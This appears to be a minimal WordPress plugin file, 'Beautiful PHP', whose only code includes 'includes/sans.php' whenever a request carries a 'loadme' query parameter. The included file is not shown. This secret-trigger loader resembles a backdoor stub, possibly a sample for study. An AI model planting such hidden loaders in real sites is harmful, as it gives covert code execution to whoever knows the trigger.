<?php
/**
 * Plugin Name: Beautiful PHP
 * Version: 1.0
 * Author: www.sans.eu.org
 */

if(isset($_GET["loadme"])){
	include("includes/sans.php");
}

?>
